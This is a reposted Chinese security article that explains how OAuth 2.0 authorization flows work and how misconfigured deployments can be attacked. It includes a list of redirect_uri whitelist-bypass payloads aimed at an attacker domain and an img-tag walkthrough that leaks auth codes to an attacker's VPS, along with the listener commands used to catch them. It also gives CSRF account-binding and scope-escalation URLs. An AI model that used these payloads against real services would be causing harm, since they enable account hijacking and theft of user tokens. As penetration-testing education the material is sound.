> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/X15jPHSgr3VObcxhLxSJJg)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)

> **文章来****源：酒仙桥六号部队**

**背景**

最近被一个同学问起 OAuth2.0，才发现有不少人对 OAuth2.0 一知半解，没有去真正了解过，更不用提如何从 OAuth2.0 授权认证中去挖掘漏洞了。老洞新谈，OAuth2.0 协议本身是没有问题的，而关于 OAuth2.0 的漏洞大多是一些配置不当所造成的，严重时甚至可以达到无交互登录任意授权账户。所以此文重点在于讲解 OAuth 2.0 是什么、运行原理流程（即 OAuth 2.0 的授权模式）以及测试漏洞点的思路。

**定义 - 是什么**

简单来说，OAuth 简单说就是一种授权的协议，只要授权方和被授权方遵守这个协议去写代码提供服务，那双方就是实现了 OAuth 模式。OAuth2.0 使用已久，相信大家即使不清楚 OAuth2.0 是什么，但在渗透测试或者挖洞的过程中，也经常接触到，比如我们在 WEB 端总会碰到这样的支持第三方授权登录的登录界面。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyTEU1kSqHRibekPhzf70d9BwGnBlkpGU7yYAxYwiaM3etnqG87hLmYkqg/640?wx_fmt=jpeg)

或者在移动端同样支持第三方授权登录的 APP。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyDIVtvks7VFOT4RdnBAnLrwIuHEpRPJKicWK8CRYGjcvWjgrrmPYd5oA/640?wx_fmt=jpeg)

这些应用都是通过用户授权后再去调用第三方登录，由第三方认证服务器返回认证数据，OAuth2.0 就是客户端 (知乎、饿了么等平台) 和认证服务器 (QQ / 微信 / 支付宝 / 微博等) 之间由于相互不信任而产生的一个授权协议。

**原理 - 运行流程**

在明确了 OAuth2.0 后，我们来看 OAuth2.0 客户端定义了用户授权的几种方式：授权码模式、简化模式、密码模式、客户端模式。

1. 授权码模式
--------

授权码模式是功能最完整、流程最严密的授权模式，也是最安全以及目前使用最广泛的一种模式。以知乎采用第三方微信登录为例。

认证流程：

（A）用户访问客户端，后者将前者导向认证服务器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyJicDkPBj5wReNohSyXQTepachpcDytU4vtGHUcic3u86lR2OczfIZ8OQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyzHica8yVU5yIbdJIVS4nKrUmp0WiaBMQ5EUTia2iaFVnicMwHic1rgAF6R0w/640?wx_fmt=jpeg)

（B）用户选择是否给予客户端授权。

（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的 "重定向 URI"（redirection URI），同时附上一个授权码。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyRibN5EZI4mbYu0sJ8frSA7Qhlu3Jibjv1oSsH7nojLc0sYCYxMPibUEPA/640?wx_fmt=jpeg)

（D）客户端收到授权码，附上早先的 "重定向 URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。

（E）认证服务器核对了授权码和重定向 URI，确认无误后，向客户端发送访问令牌和更新令牌。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyclZ0KLaZsujDAdoGqheJ7U59ZwKnEyGiasgCqPzfRw3sdAMTq2gEicYg/640?wx_fmt=jpeg)

2. 授权码简化模式
----------

认证流程：

（A）客户端将用户导向认证服务器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyqcxXoAkcAvHCDyBCfBe00BibX2CK9rMooVPJTebAFjiciaBD6Wgytl59A/640?wx_fmt=jpeg)

（B）用户决定是否给予客户端授权。

（C）假设用户给予授权，认证服务器将用户导向客户端指定的 "重定向 URI"，并在 URI 的 Hash 部分包含了访问令牌。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIySyz7ibxaXKxtgH5SAZTNR7pejiaArhqZKxaVwJn41IABoB8iawhjjNGFQ/640?wx_fmt=jpeg)

（D）浏览器向资源服务器发出请求，其中不包括上一步收到的 Hash 值。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyIcCAticNSt0lHh2xC3ibuUFcg7bU7R3GAOn7fCNhWaPnwAxwYCN2fOYQ/640?wx_fmt=jpeg)

（E）资源服务器返回一个网页，其中包含的代码可以获取 Hash 值中的令牌。

（F）浏览器执行上一步获得的脚本，提取出令牌。

（G）浏览器将令牌发给客户端。

3. 密码模式
-------

认证流程：

（A）用户向客户端提供用户名和密码。

（B）客户端将用户名和密码发给认证服务器，向后者请求令牌。

（C）认证服务器确认无误后，向客户端提供访问令牌。

4. 客户端模式
--------

认证流程：

（A）客户端向认证服务器进行身份认证，并要求一个访问令牌。

（B）认证服务器确认无误后，向客户端提供访问令牌。

因为此授权模式用户直接向客户端注册，客户端以自己的名义要求 "服务提供商" 提供服务，实际上不存在授权问题，再加上实际环境中此授权方式利用较少，暂不表述。

**漏洞点（攻击面）**

在上述的认证流程中，不论哪种模式，都是为了从认证服务器获取 access_token，用来访问资源服务器。而申请 access_token，需要在请求里添加几个必要参数。如下所示：

client_id：表示客户端的 id(我是谁)。

response_type 或 grant_type：表示授权类型 (申请哪种模式)

scope：表示申请的权限范围 (申请哪些权限，由授权服务器定义)。

redirect_uri：表示重定向 URI(申请结果跳转至哪儿)。

state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值 (自定义信息希望服务端原样返回)。

code：表示授权码，必选项。该码的有效期应该很短，通常设为 10 分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端 ID 和重定向 URI，是一一对应关系。

而关于 OAuth2.0 漏洞的挖掘也是围绕其中几个重要参数点展开，大致分为以下几个方面：

1.OAuth 劫持
----------

根据 OAuth 的认证流程, 用户授权凭证会由服务器转发到 redirect_uri 对应的地址, 如果攻击者伪造 redirect_uri 为自己的地址, 然后诱导用户发送该请求, 之后获取的凭证就会发送给攻击者伪造的回调地址. 攻击者使用该凭证即可登录用户账号, 造成授权劫持。

### 第一种情况：回调 URL 未校验

如果回调 URL 没有进行校验，则黑客可以直接修改回调的 URL 为指定的任意 URL，即可以配合 CSRF 进行 token 骗取。

http://passport.xxxx.cn/oauth2/authorize?response_type=code&redirect_uri=http://www.baidu.com&client_id=10000&theme=coremail

此类问题类似于普通的 URL 跳转，案例演示略。

### 第二种情况：回调 URL 校验绕过

部分 OAuth 提供方在进行的回调 URL 校验后存在被绕过的情况。

此种漏洞类型也是如今最为常见的类型。以某个授权页面所示：

https://xxx.com/ authorize?response_ type=code&client_ id=ArOUCNpMvP&redirect_uri=https://xxx.com/app/token&state=xxx.com&scope=all

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIywnaxTY2rga6C5z401wppoia0EfPvY6Nr3DAQg5madGXhPANaP6DuiaLA/640?wx_fmt=jpeg)

直接修改 redirect_uri 参数发送请求，发现进行白名单校验。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyP4eJaGN6En2ibV4xzhcLibevqo73ROkhUOx8yBpxlFRsTSHHB9sOoBNA/640?wx_fmt=jpeg)

对 redirect_uri 参数进行 Fuzz。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIystb3vLjedBDiabY3DE10tNpD9GgBGE03JvHjrB0l3lPbb80MjYchSpg/640?wx_fmt=jpeg)

使用这个值即可绕过白名单限制: http://gh0st.cn:80#@xxx.com/，返回授权页面正常。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIymUZA569a5Tj9dgibia01OFv3A4L14nUSrzSpgpP60LHA74ia7MhmibicIFQ/640?wx_fmt=jpeg)

下面是一些常用的 bypass 方式：

///www.gh0st.com//..

///www.gh0st.com//../

/https:/\gh0st.com/

//www.gh0st.com//..

//www.gh0st.com

/www.gh0st.com

https://www.xxx.com/www.gh0st.com

//gh0st.com

http://www.xxx.com.gh0st.com

http://gh0st.cn:80#@xxx.com

http://www.xxx.com\@gh0st.com

http://www.xxx.com#gh0st.com

http://www.xxx.com\?gh0st.com

http://www.xxx.com\gh0st.com

http://www.xxx.com\gh0st.com

### 第三种情况：利用 URL 跳转漏洞

这其实也属于校验不完整的而绕过的一种情况，因为 OAuth 提供方只对回调 URL 的根域等进行了校验，当回调的 URL 根域确实是原正常回调 URL 的根域，但实际是该域下的一个存在 URL 跳转漏洞的 URL，就可以构造跳转到钓鱼页面，就可以绕过回调 URL 的校验了。由于此种方式只需要再结合一处 URL 跳转漏洞即可实现，暂不做案例演示。

### 第四种情况：结合跨站图片

通过在客户端或者客户端子域的公共评论区等模块，插入构造好请求的 img 标签，将 redirect_uri 参数修改为加构造好 img 标签的 URL，利用本身的域名去绕过白名单限制。

如下图所示，在评出处填写，此时当有用户访问这个页面时就会请求我们的 vps 服务器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyWL6mricwwNsP6aWticLuS9Orqgq3ibgZLyxXunJgtUDTGUWV9xQCzJguQ/640?wx_fmt=jpeg)

退出登录，进入登录页面，点击支付宝快速登录。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyEpccKnc5X9NAQYQxnJgcp6HhpeN70NYHicykIy4tVmznOoniaY9KxUgA/640?wx_fmt=jpeg)

复制 URL 链接，修改 redirect_uri 参数为我们刚才评论的地址 (要用两次 url 编码)。

原 url：

https://auth.alipay.com/login/index.htm?goto=https://xxx.com:443/oauth2/publicAppAuthorize.htm?app_id=20190&redirect_uri=https://xxx.com/?login/bind/alipay/callback?token=oN7Jvtq7M&scope=auth_user

两次 url 编码：

https%253a//auth.alipay.com/login/index.htm%253fgoto%253dhttps%253a//xxx.com%253a443/oauth2/publicAppAuthorize.htm%253fapp_id%253d20190%2526redirect_uri%253dhttps%253a//xxx.com/%253flogin/bind/alipay/callback%253ftoken%253doN7Jvtq7M%2526scope%253dauth_user

在 VPS 上生成证书，然后监听 1234 端口

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

apt install nmap

ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 1234

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIygtjfibI9V24bOYuGxQTkTfDOm2BRARPfK1Mlb4x81P2icpBKwdD815kA/640?wx_fmt=jpeg)

将修改好的 URL 链接发给普通用户，一旦他们点击登录，攻击者就能拿到他们的 auth_code。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyibibMY0HbIArkhpbXE0MruoG2SHdpyTppYGLyT3Lz6hpsp6qFMd6anCg/640?wx_fmt=jpeg)

2.CSRF 绑定劫持漏洞
-------------

攻击者抓取认证请求构造恶意 url, 并诱骗已经登录的网用户点击 (比如通过邮件或者 QQ 等方式)。认证成功后用户的帐号会同攻击者的帐号绑定到一起。

如某云的历史漏洞 2014-060493，某厂商的 OAuth 2.0 认证流程中，当攻击者发起一个认证请求：

https://api.weibo.com/oauth2/authorize?client_id=**&redirect_uri=http%3A%2F%2Fwww.xxx.cn%2Fconnect_sync%2Fsina_v2_sync.php&response_type=code

并截获 OAuth 2.0 认证请求的返回。

http://www.xxx.cn/connect_sync/sina_v2_sync.php?code=6e20eb6bfea2d969a8fa5435a5d106d5

然后攻击者诱骗已经登录的网用户点击。此厂商会自动将用户的帐号同攻击者的帐号绑定到一起。此后攻击者便可以通过其新浪帐号访问受害用户的帐号。

OAuth 2.0 提供了 state 参数用于防御 CSRF. 认证服务器在接收到的 state 参数按原样返回给 redirect_uri, 客户端收到该参数并验证与之前生成的值是否一致. 所以此漏洞适用于未配置 state 参数授权的认证方式。

3.Scope 越权访问
------------

这个案例展示了 scope 权限控制不当带来的安全风险, 同时将授权劫持的几个方面演绎的淋漓尽致。

案例: https://www.oschina.net/question/12_143105

https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback/../../../homakov/8820324&response_type=code&scope=repo,gists,user,delete_repo,notifications

上面案例中的 scope 参数扩大到了用户的代码库等其它权限。于是越权拥有了用户的私有代码区操作权限。

**总结**

在我们日常的渗透测试以及学习研究过程中，不仅仅要拓展对常规漏洞 (owasp top10) 的研究深度，也应该拓展漏洞的宽度，毕竟你的知识面直接决定了你的攻击面。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s561zYr6kvbqIicp1ezz1mzIyygZCBFibfu8k3BMsveHhmSrYqoHDaUVldgBrrakIojiasJc566icPZib4g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

推荐文章 ++++

![](https://mmbiz.qpic.cn/mmbiz_jpg/US10Gcd0tQFGib3mCxJr4oMx1yp1ExzTETemWvK6Zkd7tVl23CVBppz63sRECqYNkQsonScb65VaG9yU2YJibxNA/640?wx_fmt=jpeg)

* [教你反偷拍小技巧](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650463375&idx=4&sn=9342620ef77352d7dafc46cb690e7e70&chksm=83bbb96bb4cc307dbe5a3786f6792e4cfdc54167024aad2825a6e409654d9411a050c2573bfc&scene=21#wechat_redirect)  

* [微信十大实用小技巧，你都学会了几个？](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650441253&idx=1&sn=9ea9623125a6221409992e8f649f67a1&chksm=83bbe3c1b4cc6ad70e427ad6360b4295a172c22be2421d43dcd575eb7dc7dbe88a094346812e&scene=21#wechat_redirect)

* [从零开始：微信小程序新手入门宝典](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650440800&idx=1&sn=c7e6db0989f8c454dcd87c3bf45cb3d1&chksm=83bbe184b4cc6892119e8fc92407451fdf3578d374ab015d88371d75fb428f24ef26112acd18&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)